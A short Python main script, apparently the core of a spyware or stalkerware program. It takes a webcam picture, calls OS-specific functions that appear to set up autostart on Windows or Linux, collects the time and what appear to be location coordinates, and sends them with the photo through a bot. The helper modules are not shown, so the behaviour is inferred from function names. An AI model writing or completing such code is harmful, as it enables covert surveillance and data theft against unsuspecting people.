from utils import (
    defining_operating_system, take_picture_from_camera,
    when_send_time, current_cwordints,
    recording_auto_upload_windows, recording_auto_upload_linux
)
from bot import bot_lik
from configurations import PICTURE_NAME, SENDING_TEXT


def main():
    """Основа програмы."""
    take_picture_from_camera()
    if defining_operating_system() == 'windows':
        recording_auto_upload_windows()
    else:
        recording_auto_upload_linux()
    SENDING_TEXT['data_time'] = when_send_time()
    SENDING_TEXT['the_сardinals'] = current_cwordints()
    bot_lik(SENDING_TEXT, PICTURE_NAME)


if __name__ == '__main__':
    main()
